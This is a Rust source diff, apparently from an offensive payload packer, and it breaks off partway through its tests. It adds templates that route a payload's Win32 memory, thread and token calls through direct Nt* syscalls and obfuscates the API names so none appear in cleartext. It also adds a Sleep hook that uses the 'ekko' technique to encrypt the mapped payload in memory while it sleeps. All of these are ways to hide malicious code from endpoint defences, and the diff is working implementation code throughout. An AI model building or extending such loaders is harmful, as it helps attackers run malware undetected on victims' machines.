@@ -48,6 +48,57 @@ pub struct YamlApiResolutionPlan {
     /// What to do with imports not in the catalogue (`forward` or `abort`).
     #[serde(default = "default_unmatched")]
     pub unmatched: String,
+
+    /// Per-API behavior for intercepted calls that is not a plain route.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub hooks: Option<YamlHooks>,
+}
+
+/// `build.stub.api_resolution.hooks`: interception behavior that needs its own
+/// parameters (the IAT seam is the same; the action is not a route).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+pub struct YamlHooks {
+    /// Obfuscate the payload's mapped image while it sleeps.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub sleep: Option<YamlSleepHook>,
+}
+
+/// `hooks.sleep`: the `Sleep` proxy runs ekko over the mapped payload.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct YamlSleepHook {
+    /// Obfuscation variant. Only `ekko` is implemented.
+    #[serde(default = "default_obfuscate")]
+    pub obfuscate: String,
+
+    /// Sleeps shorter than this are a plain delay: a payload that yields with
+    /// `Sleep(0)` or polls with short sleeps must not pay the ROP chain.
+    #[serde(default = "default_min_ms")]
+    pub min_ms: u64,
+
+    /// Sleeps longer than this are a plain delay: the image stays encrypted
+    /// only for a bounded window.
+    #[serde(default = "default_max_ms")]
+    pub max_ms: u64,
+
+    /// Acknowledges that the payload does not execute from the mapped image on
+    /// another thread while it sleeps. Ekko cannot encrypt a region that is
+    /// still running; a multi-threaded payload would crash.
+    #[serde(default)]
+    pub assume_single_threaded: bool,
+}
+
+fn default_obfuscate() -> String {
+    "ekko".to_string()
+}
+
+fn default_min_ms() -> u64 {
+    1000
+}
+
+fn default_max_ms() -> u64 {
+    600_000
 }
 
 fn default_mode() -> String {
@@ -257,7 +308,66 @@ pub const CATALOGUE: &[ApiEntry] = &[
         strategy: Strategy::RouteToNt,
         nt: Some("NtSetInformationThread"),
     },
+    // Process-memory primitives. These are `Handler` entries: the Win32
+    // signatures take the current process implicitly, so the wrapper rebuilds
+    // the call on the native helper instead of forwarding it.
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualAlloc",
+        strategy: Strategy::Handler,
+        nt: Some("NtAllocateVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualProtect",
+        strategy: Strategy::Handler,
+        nt: Some("NtProtectVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualFree",
+        strategy: Strategy::Handler,
+        nt: Some("NtFreeVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "CloseHandle",
+        strategy: Strategy::Handler,
+        nt: Some("NtClose"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "WaitForSingleObject",
+        strategy: Strategy::Handler,
+        nt: Some("NtWaitForSingleObject"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualQuery",
+        strategy: Strategy::Handler,
+        nt: Some("NtQueryVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "CreateThread",
+        strategy: Strategy::Handler,
+        nt: Some("NtCreateThreadEx"),
+    },
+    ApiEntry {
+        dll: "advapi32",
+        func: "OpenThreadToken",
+        strategy: Strategy::Handler,
+        nt: Some("NtOpenThreadToken"),
+    },
 ];
+
+/// Additional `Nt*` helpers a handler calls beyond [`ApiEntry::nt`].
+///
+/// Kept as a table so the catalogue literals stay one-helper-per-entry: the
+/// `CreateThread` wrapper also queries `ThreadBasicInformation` to fill
+/// `lpThreadId`, which the native create call does not return.
+const EXTRA_SYSCALLS: &[(&str, &str, &str)] =
+    &[("kernel32", "CreateThread", "NtQueryInformationThread")];
 
 /// Resolved `build.stub.api_resolution` configuration.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -268,6 +378,75 @@ pub struct ApiResolutionConfig {
     pub apis: Vec<ApiEntry>,
     /// What to do with imports not in the catalogue.
     pub unmatched: Unmatched,
+    /// Interception behavior that is not a plain route.
+    pub hooks: HooksConfig,
+}
+
+/// Resolved `hooks:` block.
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub struct HooksConfig {
+    /// Obfuscate the payload while it sleeps, or `None`.
+    pub sleep: Option<SleepHookConfig>,
+}
+
+/// Resolved `hooks.sleep`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct SleepHookConfig {
+    /// Shortest sleep that is obfuscated, in milliseconds.
+    pub min_ms: u32,
+    /// Longest sleep that is obfuscated, in milliseconds.
+    pub max_ms: u32,
+}
+
+impl HooksConfig {
+    /// Resolves and validates the hook block.
+    ///
+    /// `assume_single_threaded` is a hard requirement in this phase: the chain
+    /// encrypts the mapped image, so a payload thread executing from it would
+    /// fault. The field forces the operator to acknowledge that constraint
+    /// instead of discovering it in the lab.
+    fn from_yaml(yaml: &YamlHooks) -> Result<Self> {
+        let sleep = match &yaml.sleep {
+            Some(sleep) => {
+                if sleep.obfuscate != "ekko" {
+                    return Err(PackerError::Validation(format!(
+                        "invalid build.stub.api_resolution.hooks.sleep.obfuscate '{}': expected \
+                         'ekko' (foliage and cronos are not implemented)",
+                        sleep.obfuscate
+                    )));
+                }
+                if sleep.min_ms > sleep.max_ms {
+                    return Err(PackerError::Validation(format!(
+                        "build.stub.api_resolution.hooks.sleep.min_ms ({}) is greater than max_ms \
+                         ({})",
+                        sleep.min_ms, sleep.max_ms
+                    )));
+                }
+                if sleep.max_ms > u32::MAX as u64 {
+                    return Err(PackerError::Validation(format!(
+                        "build.stub.api_resolution.hooks.sleep.max_ms ({}) exceeds the maximum of \
+                         {}",
+                        sleep.max_ms,
+                        u32::MAX
+                    )));
+                }
+                if !sleep.assume_single_threaded {
+                    return Err(PackerError::Validation(
+                        "build.stub.api_resolution.hooks.sleep encrypts the mapped payload image \
+                         while it sleeps, so no other payload thread may execute from it: set \
+                         'assume_single_threaded: true' to acknowledge that constraint"
+                            .to_string(),
+                    ));
+                }
+                Some(SleepHookConfig {
+                    min_ms: sleep.min_ms as u32,
+                    max_ms: sleep.max_ms as u32,
+                })
+            }
+            None => None,
+        };
+        Ok(Self { sleep })
+    }
 }
 
 impl Default for ApiResolutionConfig {
@@ -276,6 +455,7 @@ impl Default for ApiResolutionConfig {
             mode: ApiResolutionMode::None,
             apis: Vec::new(),
             unmatched: Unmatched::Forward,
+            hooks: HooksConfig::default(),
         }
     }
 }
@@ -349,18 +529,31 @@ impl ApiResolutionConfig {
             }
         }
 
-        Ok(Self {
+        let config = Self {
             mode,
             apis,
             unmatched,
-        })
+            hooks: match &yaml.hooks {
+                Some(hooks) => HooksConfig::from_yaml(hooks)?,
+                None => HooksConfig::default(),
+            },
+        };
+        if config.hooks.sleep.is_some() && config.mode != ApiResolutionMode::Proxy {
+            return Err(PackerError::Validation(
+                "build.stub.api_resolution.hooks requires 'mode: proxy': a hook replaces the \
+                 payload's import slot with a generated proxy"
+                    .to_string(),
+            ));
+        }
+        Ok(config)
     }
 
     /// Whether the configuration does nothing at build time.
     ///
-    /// True when the mode is `none`, or when `proxy` declares no API to intercept.
+    /// True when the mode is `none`, or when `proxy` declares neither an API to
+    /// intercept nor a hook.
     pub fn is_noop(&self) -> bool {
-        self.mode == ApiResolutionMode::None || self.apis.is_empty()
+        self.mode == ApiResolutionMode::None || (self.apis.is_empty() && self.hooks.sleep.is_none())
     }
 }
 
@@ -421,17 +614,29 @@ fn unknown_api(selector: &str) -> PackerError {
 /// The `Nt*` functions the selected proxies route to.
 impl ApiResolutionConfig {
     /// The `Nt*` helpers the syscall layer must provide for the selected
-    /// `route_to_nt` entries, deduplicated and in the catalogue order.
+    /// entries, deduplicated and in the catalogue order.
+    ///
+    /// Both a direct route and a handler declare the helper it ends up calling:
+    /// a `RouteToNt` entry forwards to it, and a `Handler` (the Win32 wrappers)
+    /// calls it from its body.
     pub fn required_syscalls(&self) -> Vec<&'static str> {
         let mut out: Vec<&'static str> = Vec::new();
         for entry in &self.apis {
-            if entry.strategy == Strategy::RouteToNt {
-                if let Some(nt) = entry.nt {
-                    if !out.contains(&nt) {
-                        out.push(nt);
-                    }
+            if let Some(nt) = entry.nt {
+                if !out.contains(&nt) {
+                    out.push(nt);
                 }
             }
+            for (dll, func, extra) in EXTRA_SYSCALLS {
+                if entry.dll == *dll && entry.func == *func && !out.contains(extra) {
+                    out.push(extra);
+                }
+            }
+        }
+        // The `Sleep` hook degrades to a real delay on every path it does not
+        // obfuscate, and that delay is `NtDelayExecution`.
+        if self.hooks.sleep.is_some() && !out.contains(&"NtDelayExecution") {
+            out.push("NtDelayExecution");
         }
         out
     }
@@ -447,7 +652,9 @@ impl ApiResolutionConfig {
 /// comments (stripped from the source-literal guard) and in `proxy_<index>`
 /// identifiers.
 pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> String {
-    if config.mode != ApiResolutionMode::Proxy || config.apis.is_empty() {
+    if config.mode != ApiResolutionMode::Proxy
+        || (config.apis.is_empty() && config.hooks.sleep.is_none())
+    {
         return NOOP_BLOCK.to_string();
     }
 
@@ -472,6 +679,23 @@ pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> St
         ));
     }
 
+    // A hook matches by function name only. API-set imports (`Sleep` commonly
+    // arrives through `api-ms-win-core-synch-*`) name a virtual module, so a
+    // module comparison would miss them; `Sleep` is unambiguous enough.
+    if let Some(sleep) = &config.hooks.sleep {
+        let index = config.apis.len();
+        proxies.push_str(&sleep_hook_proxy(index, sleep));
+        proxies.push('\n');
+        let function_def = strings
+            .obfuscate("Sleep")
+            .render_stub_expr("hook_sleep_function");
+        matches.push_str(&format!(
+            "        {{\n            let want_function: String = {function_def};\n            if func == \
+             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
+             }}\n"
+        ));
+    }
+
     let miss = match config.unmatched {
         Unmatched::Forward => "crate::ImportPolicy::Forward",
         Unmatched::Abort => "crate::ImportPolicy::Abort",
@@ -487,6 +711,18 @@ pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> St
 /// obfuscated bytes carries it into the source or the binary.
 fn proxy_id(index: usize) -> String {
     format!("proxy_{index}")
+}
+
+/// The `Sleep` hook body: conceals the mapped payload for the duration of the
+/// sleep, and degrades to a real delay whenever it must not or cannot.
+fn sleep_hook_proxy(index: usize, hook: &SleepHookConfig) -> String {
+    let id = proxy_id(index);
+    let comment = "hook for kernel32!Sleep: ekko over the mapped payload";
+    SLEEP_HOOK
+        .replace("$ID$", &id)
+        .replace("$COMMENT$", comment)
+        .replace("$MIN_MS$", &hook.min_ms.to_string())
+        .replace("$MAX_MS$", &hook.max_ms.to_string())
 }
 
 /// The body of the proxy for one selected entry.
@@ -542,6 +778,30 @@ fn proxy_body(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String
             .replace("$ID$", &id)
             .replace("$COMMENT$", &comment),
         "ImpersonateLoggedOnUser" => WRAPPER_IMPERSONATE_LOGGED_ON_USER
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "VirtualAlloc" => WRAPPER_VIRTUAL_ALLOC
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "VirtualProtect" => WRAPPER_VIRTUAL_PROTECT
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "VirtualFree" => WRAPPER_VIRTUAL_FREE
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "CloseHandle" => WRAPPER_CLOSE_HANDLE
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "WaitForSingleObject" => WRAPPER_WAIT_FOR_SINGLE_OBJECT
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "VirtualQuery" => WRAPPER_VIRTUAL_QUERY
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "CreateThread" => WRAPPER_CREATE_THREAD
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "OpenThreadToken" => WRAPPER_OPEN_THREAD_TOKEN
             .replace("$ID$", &id)
             .replace("$COMMENT$", &comment),
         // Unreachable for the shipped catalogue; kept so an entry without a body
@@ -654,6 +914,24 @@ $POLICY_MATCHES$
         let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
         let lower = base.to_ascii_lowercase();
         lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
+    }
+
+    /// `NtCurrentProcess()`: the `(HANDLE)-1` pseudo-handle.
+    #[allow(dead_code)]
+    fn current_process() -> windows::Win32::Foundation::HANDLE {
+        windows::Win32::Foundation::HANDLE(-1isize as *mut core::ffi::c_void)
+    }
+
+    /// Publishes an NTSTATUS failure as the Win32 last error.
+    #[allow(dead_code)]
+    fn set_last_error(status: i32) {
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
     }
 
 $PROXIES$
@@ -980,7 +1258,7 @@ const WRAPPER_OPEN_PROCESS_TOKEN: &str = r#"    /// $COMMENT$: rebuilt on NtOpen
         desired_access: u32,
         token: *mut core::ffi::c_void,
     ) -> i32 {
-        let status = crate::nt_open_process_token(process, desired_access, core::ptr::null(), token);
+        let status = crate::nt_open_process_token(process, desired_access, token);
         if status >= 0 {
             return 1;
         }
@@ -996,13 +1274,15 @@ const WRAPPER_OPEN_PROCESS_TOKEN: &str = r#"    /// $COMMENT$: rebuilt on NtOpen
 "#;
 
 const WRAPPER_DUPLICATE_TOKEN_EX: &str = r#"    /// $COMMENT$: rebuilt on NtDuplicateToken. `lpTokenAttributes` is ignored
-    /// (the native call takes no security attributes); the impersonation level
-    /// and token type pass through unchanged (same enum values).
+    /// (the native call takes `OBJECT_ATTRIBUTES`, not `SECURITY_ATTRIBUTES`),
+    /// and so is the requested impersonation level: the native fourth argument
+    /// is `EffectiveOnly`, which is passed as 0 so the duplicate is not filtered.
+    /// The token type passes through unchanged (same enum values).
     extern "system" fn $ID$(
         existing: windows::Win32::Foundation::HANDLE,
         desired_access: u32,
         _attributes: *const core::ffi::c_void,
-        impersonation_level: i32,
+        _impersonation_level: i32,
         token_type: i32,
         new_token: *mut core::ffi::c_void,
     ) -> i32 {
@@ -1010,7 +1290,7 @@ const WRAPPER_DUPLICATE_TOKEN_EX: &str = r#"    /// $COMMENT$: rebuilt on NtDupl
             existing,
             desired_access,
             core::ptr::null(),
-            impersonation_level,
+            0,
             token_type,
             new_token,
         );
@@ -1140,6 +1420,313 @@ const FORWARD_TEMPLATE: &str = r#"    /// $COMMENT$: forwards to the original ex
                 None => 0,
             }
         })
+    }
+"#;
+
+const WRAPPER_VIRTUAL_ALLOC: &str = r#"    /// $COMMENT$: rebuilt on NtAllocateVirtualMemory for the current process.
+    ///
+    /// `VirtualAlloc` takes the current process implicitly, so the proxy passes
+    /// the `(HANDLE)-1` pseudo-handle. `address` stays a hint: the native call
+    /// honours a free region there or picks another one, as Win32 does.
+    extern "system" fn $ID$(
+        address: *mut core::ffi::c_void,
+        size: usize,
+        alloc_type: u32,
+        protect: u32,
+    ) -> *mut core::ffi::c_void {
+        let mut base = address;
+        let mut region = size;
+        let status = crate::nt_alloc_vm(
+            current_process(),
+            &mut base,
+            0,
+            &mut region,
+            alloc_type,
+            protect,
+        );
+        if status >= 0 {
+            return base;
+        }
+        set_last_error(status);
+        core::ptr::null_mut()
+    }
+"#;
+
+const WRAPPER_VIRTUAL_PROTECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        address: *const core::ffi::c_void,
+        size: usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> i32 {
+        let status = crate::nt_protect_vm(
+            current_process(),
+            address as *mut core::ffi::c_void,
+            size,
+            new_protect,
+            old_protect,
+        );
+        if status >= 0 {
+            return 1;
+        }
+        set_last_error(status);
+        0
+    }
+"#;
+
+const WRAPPER_VIRTUAL_FREE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtFreeVirtualMemory
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    ///
+    /// `MEM_RELEASE` still requires `size == 0`; the proxy passes both values
+    /// through unchanged so the kernel enforces the same contract.
+    extern "system" fn $ID$(
+        address: *mut core::ffi::c_void,
+        size: usize,
+        free_type: u32,
+    ) -> i32 {
+        let mut base = address;
+        let mut region = size;
+        let status = crate::nt_free_vm(current_process(), &mut base, &mut region, free_type);
+        if status >= 0 {
+            return 1;
+        }
+        set_last_error(status);
+        0
+    }
+"#;
+
+const WRAPPER_CLOSE_HANDLE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtClose
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(handle: windows::Win32::Foundation::HANDLE) -> i32 {
+        let status = crate::nt_close(handle);
+        if status >= 0 {
+            return 1;
+        }
+        set_last_error(status);
+        0
+    }
+"#;
+
+const WRAPPER_WAIT_FOR_SINGLE_OBJECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWaitForSingleObject
+    /// (relative timeout in 100 ns units, `WAIT_*` results preserved).
+    ///
+    /// `INFINITE` becomes a null timeout. `STATUS_WAIT_0` and `STATUS_TIMEOUT`
+    /// share their values with `WAIT_OBJECT_0` and `WAIT_TIMEOUT`, so a success
+    /// status is returned unchanged; a failure becomes `WAIT_FAILED` with the
+    /// translated Win32 error.
+    extern "system" fn $ID$(
+        handle: windows::Win32::Foundation::HANDLE,
+        milliseconds: u32,
+    ) -> u32 {
+        let timeout: i64 = if milliseconds == u32::MAX {
+            0
+        } else {
+            -((milliseconds as i64) * 10_000)
+        };
+        let timeout_ptr: *const i64 = if milliseconds == u32::MAX {
+            core::ptr::null()
+        } else {
+            &timeout as *const i64
+        };
+        let status = crate::nt_wait_for_single_object_native(handle, 0, timeout_ptr);
+        if status >= 0 {
+            return status as u32;
+        }
+        set_last_error(status);
+        0xFFFF_FFFF
+    }
+"#;
+
+const WRAPPER_VIRTUAL_QUERY: &str = r#"    /// $COMMENT$: rebuilt on NtQueryVirtualMemory(MemoryBasicInformation) for
+    /// the current process. The native class-0 structure is the Win32
+    /// `MEMORY_BASIC_INFORMATION`.
+    extern "system" fn $ID$(
+        address: *const core::ffi::c_void,
+        buffer: *mut windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
+        length: usize,
+    ) -> usize {
+        let mut returned = 0usize;
+        let status = crate::nt_query_vm(
+            current_process(),
+            address,
+            0,
+            buffer as *mut core::ffi::c_void,
+            length,
+            &mut returned as *mut usize,
+        );
+        if status >= 0 {
+            return returned;
+        }
+        set_last_error(status);
+        0
+    }
+"#;
+
+const WRAPPER_CREATE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx for the current process.
+    ///
+    /// `lpThreadAttributes` is ignored (the native call takes no security
+    /// attributes) and `STACK_SIZE_PARAM_IS_A_RESERVATION` is not honoured:
+    /// `stack_size` always becomes the initial stack. `CREATE_SUSPENDED` maps to
+    /// `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`. `lpThreadId`, when non-null, is
+    /// filled from `ThreadBasicInformation`, because the native call returns no
+    /// thread id.
+    extern "system" fn $ID$(
+        thread_attributes: *const core::ffi::c_void,
+        stack_size: usize,
+        start: *mut core::ffi::c_void,
+        parameter: *mut core::ffi::c_void,
+        creation_flags: u32,
+        thread_id: *mut u32,
+    ) -> windows::Win32::Foundation::HANDLE {
+        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
+        const CREATE_SUSPENDED: u32 = 0x0000_0004;
+        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
+
+        let _ = thread_attributes;
+        let mut handle = windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
+        let flags = if creation_flags & CREATE_SUSPENDED != 0 {
+            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
+        } else {
+            0
+        };
+        let status = crate::nt_create_thread_ex_native(
+            &mut handle,
+            THREAD_ALL_ACCESS,
+            core::ptr::null(),
+            current_process(),
+            start,
+            parameter,
+            flags,
+            0,
+            stack_size,
+            0,
+            core::ptr::null(),
+        );
+        if status < 0 {
+            set_last_error(status);
+            return windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
+        }
+        if !thread_id.is_null() {
+            #[repr(C)]
+            struct ClientId {
+                unique_process: *mut core::ffi::c_void,
+                unique_thread: *mut core::ffi::c_void,
+            }
+            #[repr(C)]
+            struct ThreadBasicInformation {
+                exit_status: i32,
+                teb_base: *mut core::ffi::c_void,
+                client_id: ClientId,
+                affinity_mask: usize,
+                priority: i32,
+                base_priority: i32,
+            }
+            let mut info = ThreadBasicInformation {
+                exit_status: 0,
+                teb_base: core::ptr::null_mut(),
+                client_id: ClientId {
+                    unique_process: core::ptr::null_mut(),
+                    unique_thread: core::ptr::null_mut(),
+                },
+                affinity_mask: 0,
+                priority: 0,
+                base_priority: 0,
+            };
+            let mut returned = 0u32;
+            let query = crate::nt_query_info_thread(
+                handle,
+                0,
+                &mut info as *mut ThreadBasicInformation as *mut core::ffi::c_void,
+                core::mem::size_of::<ThreadBasicInformation>() as u32,
+                &mut returned,
+            );
+            if query >= 0 {
+                unsafe {
+                    *thread_id = info.client_id.unique_thread as usize as u32;
+                }
+            }
+        }
+        handle
+    }
+"#;
+
+const WRAPPER_OPEN_THREAD_TOKEN: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtOpenThreadToken
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        thread: windows::Win32::Foundation::HANDLE,
+        access: u32,
+        open_as_self: i32,
+        token: *mut windows::Win32::Foundation::HANDLE,
+    ) -> i32 {
+        let status = crate::nt_open_thread_token(
+            thread,
+            access,
+            (open_as_self != 0) as u8,
+            token as *mut core::ffi::c_void,
+        );
+        if status >= 0 {
+            return 1;
+        }
+        set_last_error(status);
+        0
+    }
+"#;
+
+const SLEEP_HOOK: &str = r#"    /// $COMMENT$: encrypts the mapped payload while it sleeps.
+    ///
+    /// Every path that does not obfuscate (a short sleep, `INFINITE`, no
+    /// recorded region, a concurrent obfuscated sleep, or an ekko setup
+    /// failure) degrades to a real `NtDelayExecution` delay, so the payload
+    /// keeps the Win32 contract either way.
+    extern "system" fn $ID$(milliseconds: u32) {
+        use core::sync::atomic::{AtomicBool, Ordering};
+
+        /// One ekko chain at a time: the chain is not reentrant.
+        static CONCEALING: AtomicBool = AtomicBool::new(false);
+        const MIN_MS: u32 = $MIN_MS$;
+        const MAX_MS: u32 = $MAX_MS$;
+        const INFINITE: u32 = 0xFFFF_FFFF;
+
+        fn delay(milliseconds: u32) {
+            if milliseconds == INFINITE {
+                unsafe {
+                    crate::nt_delay_execution(0, core::ptr::null());
+                }
+                return;
+            }
+            let timeout: i64 = -((milliseconds as i64) * 10_000);
+            unsafe {
+                crate::nt_delay_execution(0, &timeout as *const i64);
+            }
+        }
+
+        if milliseconds == 0
+            || milliseconds == INFINITE
+            || milliseconds < MIN_MS
+            || milliseconds > MAX_MS
+        {
+            delay(milliseconds);
+            return;
+        }
+        let Some((base, size)) = crate::payload_region::get() else {
+            delay(milliseconds);
+            return;
+        };
+        if CONCEALING
+            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
+            .is_err()
+        {
+            delay(milliseconds);
+            return;
+        }
+        let result = crate::sleep_runtime::ekko_sleep(base, size, milliseconds);
+        CONCEALING.store(false, Ordering::Release);
+        if result.is_err() {
+            delay(milliseconds);
+        } else {
+            crate::payload_region::record_conceal();
+        }
     }
 "#;
 
@@ -1477,6 +2064,194 @@ mod tests {
         assert!(block.contains("crate::nt_open_process"));
     }
 
+    /// The process-memory wrappers rebuild the Win32 signatures on the native
+    /// helpers and declare the syscall each one ends up calling.
+    #[test]
+    fn memory_and_handle_wrappers_route_to_the_native_helpers() {
+        let config = proxy_config(&[
+            "kernel32!VirtualAlloc",
+            "kernel32!VirtualProtect",
+            "kernel32!VirtualFree",
+            "kernel32!CloseHandle",
+            "kernel32!WaitForSingleObject",
+        ]);
+        assert_eq!(
+            config.required_syscalls(),
+            vec![
+                "NtAllocateVirtualMemory",
+                "NtProtectVirtualMemory",
+                "NtFreeVirtualMemory",
+                "NtClose",
+                "NtWaitForSingleObject"
+            ]
+        );
+
+        let block = render_block(&config, &xor_strings());
+        for helper in [
+            "crate::nt_alloc_vm",
+            "crate::nt_protect_vm",
+            "crate::nt_free_vm",
+            "crate::nt_close",
+            "crate::nt_wait_for_single_object_native",
+        ] {
+            assert!(block.contains(helper), "missing {helper}: {block}");
+        }
+        assert!(block.contains("current_process()"));
+        assert!(block.contains("set_last_error("));
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+
+        let code = code_only(&block);
+        for name in [
+            "VirtualAlloc",
+            "VirtualProtect",
+            "VirtualFree",
+            "CloseHandle",
+            "WaitForSingleObject",
+        ] {
+            assert!(!code.contains(name), "cleartext name leaked: {name}");
+        }
+    }
+
+    /// `NtFreeVirtualMemory` is also selectable as a direct `ntdll!` route.
+    #[test]
+    fn ntdll_free_route_renders_a_direct_proxy() {
+        let config = proxy_config(&["ntdll!NtFreeVirtualMemory"]);
+        assert_eq!(config.required_syscalls(), vec!["NtFreeVirtualMemory"]);
+        let block = render_block(&config, &xor_strings());
+        assert!(block.contains("extern \"system\" fn proxy_0"), "{block}");
+        assert!(block.contains("crate::nt_free_vm"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+    }
+
+    /// The batch-2 wrappers: a query, a thread create (which also needs
+    /// `ThreadBasicInformation`) and a token open.
+    #[test]
+    fn query_thread_and_token_wrappers_route_to_the_native_helpers() {
+        let config = proxy_config(&[
+            "kernel32!VirtualQuery",
+            "kernel32!CreateThread",
+            "advapi32!OpenThreadToken",
+        ]);
+        assert_eq!(
+            config.required_syscalls(),
+            vec![
+                "NtQueryVirtualMemory",
+                "NtCreateThreadEx",
+                "NtQueryInformationThread",
+                "NtOpenThreadToken"
+            ]
+        );
+
+        let block = render_block(&config, &xor_strings());
+        for helper in [
+            "crate::nt_query_vm",
+            "crate::nt_create_thread_ex_native",
+            "crate::nt_query_info_thread",
+            "crate::nt_open_thread_token",
+        ] {
+            assert!(block.contains(helper), "missing {helper}: {block}");
+        }
+        assert!(block.contains("ThreadBasicInformation"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+        let code = code_only(&block);
+        for name in ["VirtualQuery", "CreateThread", "OpenThreadToken"] {
+            assert!(!code.contains(name), "cleartext name leaked: {name}");
+        }
+    }
+
+    fn parse_api_resolution(yaml: &str) -> Result<ApiResolutionConfig> {
+        let yaml: YamlApiResolutionPlan = serde_yml::from_str(yaml).expect("valid YAML");
+        ApiResolutionConfig::from_yaml(Some(&yaml))
+    }
+
+    #[test]
+    fn parses_the_sleep_hook_with_defaults() {
+        let config = parse_api_resolution(
+            "mode: proxy\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
+        )
+        .expect("valid hook");
+        let sleep = config.hooks.sleep.expect("the hook should be present");
+        assert_eq!(sleep.min_ms, 1000);
+        assert_eq!(sleep.max_ms, 600_000);
+        assert!(!config.is_noop(), "a hook alone still installs a proxy");
+    }
+
+    #[test]
+    fn parses_explicit_hook_values() {
+        let config = parse_api_resolution(
+            "mode: proxy\nhooks:\n  sleep:\n    min_ms: 2000\n    max_ms: 120000\n    assume_single_threaded: true\n",
+        )
+        .expect("valid hook");
+        let sleep = config.hooks.sleep.expect("the hook should be present");
+        assert_eq!(sleep.min_ms, 2000);
+        assert_eq!(sleep.max_ms, 120_000);
+    }
+
+    #[test]
+    fn hook_requires_the_single_thread_acknowledgement() {
+        let err = parse_api_resolution("mode: proxy\nhooks:\n  sleep: {}\n")
+            .expect_err("the hook must require the acknowledgement");
+        assert!(err.to_string().contains("assume_single_threaded"));
+    }
+
+    #[test]
+    fn hook_requires_proxy_mode() {
+        let err = parse_api_resolution(
+            "mode: none\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
+        )
+        .expect_err("a hook without proxy mode must fail");
+        assert!(err.to_string().contains("mode: proxy"));
+    }
+
+    #[test]
+    fn hook_rejects_an_unimplemented_variant() {
+        let err = parse_api_resolution(
+            "mode: proxy\nhooks:\n  sleep:\n    obfuscate: foliage\n    assume_single_threaded: true\n",
+        )
+        .expect_err("a non-ekko variant must fail");
+        assert!(err.to_string().contains("foliage"));
+    }
+
+    #[test]
+    fn hook_rejects_an_inverted_window() {
+        let err = parse_api_resolution(
+            "mode: proxy\nhooks:\n  sleep:\n    min_ms: 5000\n    max_ms: 1000\n    assume_single_threaded: true\n",
+        )
+        .expect_err("min_ms > max_ms must fail");
+        assert!(err.to_string().contains("greater than"));
+    }
+
+    /// With only a hook, the block still declares `NtDelayExecution`, proxies
+    /// `Sleep` by function name (API-set imports name a virtual module) and
+    /// never traces on the payload thread.
+    #[test]
+    fn a_hook_alone_renders_a_complete_proxy() {
+        let config = parse_api_resolution(
+            "mode: proxy\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
+        )
+        .expect("valid hook");
+        assert_eq!(config.required_syscalls(), vec!["NtDelayExecution"]);
+
+        let block = render_block(&config, &xor_strings());
+        assert!(
+            block.contains("crate::sleep_runtime::ekko_sleep"),
+            "{block}"
+        );
+        assert!(block.contains("crate::payload_region::get()"), "{block}");
+        assert!(block.contains("crate::nt_delay_execution"), "{block}");
